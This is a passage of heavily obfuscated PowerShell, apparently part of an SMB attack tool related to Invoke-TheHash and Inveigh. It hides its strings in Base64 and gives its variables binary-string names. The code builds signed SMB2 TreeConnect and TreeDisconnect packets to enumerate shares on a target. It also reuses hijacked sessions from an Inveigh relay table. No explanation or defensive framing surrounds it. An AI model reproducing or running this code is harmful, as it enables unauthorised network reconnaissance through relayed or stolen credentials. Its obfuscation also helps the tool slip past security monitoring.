                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBlAHMAcwBpAG8AbgA=')))
                                        {
                                            ${01011011111111111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBoAGEAcgBlAA==')))
                                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        }
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBoAGEAcgBlAA==')))
                                        {
                                            if(${10011101011100100}.Count -gt 0 -and ${01001011101111011} -lt ${10011101011100100}.Count - 1)
                                            {
                                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                                ${01001011101111011}++
                                            }
                                            elseif(${10011101011100100}.Count -gt 0 -and ${01001011101111011} -eq ${10011101011100100}.Count - 1)
                                            {
                                                echo ${10101000011010100} | sort -property Share |ft -AutoSize
                                                ${10111010000000010} = ${01000011000100001}
                                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                                ${01001011101111011}++
                                            }
                                            else
                                            {
                                                if(${00001011000111111} -and !$Logoff)
                                                {
                                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                                }
                                                else
                                                {
                                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                                }
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -and ${10011101011100100}.Count -gt 0 -and ${01001011101111011} -lt ${10011101011100100}.Count - 1)
                                    {
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        ${01001011101111011}++
                                    }
                                    elseif(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -and ${10011101011100100}.Count -gt 0 -and ${01001011101111011} -eq ${10011101011100100}.Count - 1)
                                    {
                                        if($TargetShow)
                                        {
                                            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdAAgAFMAaABhAHIAZQBzADoA')))
                                        }
                                        echo ${10101000011010100} | sort -property Share |ft -AutoSize
                                        ${10111010000000010} = ${01000011000100001}
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                        ${01001011101111011}++
                                    }
                                    else
                                    {
                                        if(${00001011000111111} -and !$Logoff)
                                        {
                                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                        }
                                        else
                                        {
                                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                        }
                                    }
                                }
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        if(${10011101011100100}.Count -gt 0)
                        {
                            ${10001011000000101} = "\\" + $Target + "\" + ${10011101011100100}[${01001011101111011}]
                            ${01110011000011011} = [System.Text.Encoding]::Unicode.GetBytes(${10001011000000101})
                        }
                        ${00011010101110011} = _01000000010000001 0x03,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _10101111000101000 ${01110011000011011}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}    
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} 
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        try
                        {
                            ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                            ${00010110101011010}.Flush()
                            ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                            if(_00010100011010010 ${10110001011001111}[12..15])
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                            }
                            else
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                            }
                        }
                        catch
                        {
                            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcwBzAGkAbwBuACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAGkAcwAgAGMAbABvAHMAZQBkAA==')))
                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x04,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${01111100101100101} = _10000111011000010
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101}
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10111100010001110}.Length
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
            }
        }
   }
    if(${00001011000111111} -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAbgA=')))
        $inveigh.session_message_ID_table[$session] = ${01000100011101010}
        $inveigh.session[$session] | ? {$_."Last Activity" = Get-Date -format s}
    }
    if(!${00001011000111111} -or $Logoff)
    {
        ${00101111101110011}.Close()
        ${00010110101011010}.Close()
    }
}
}

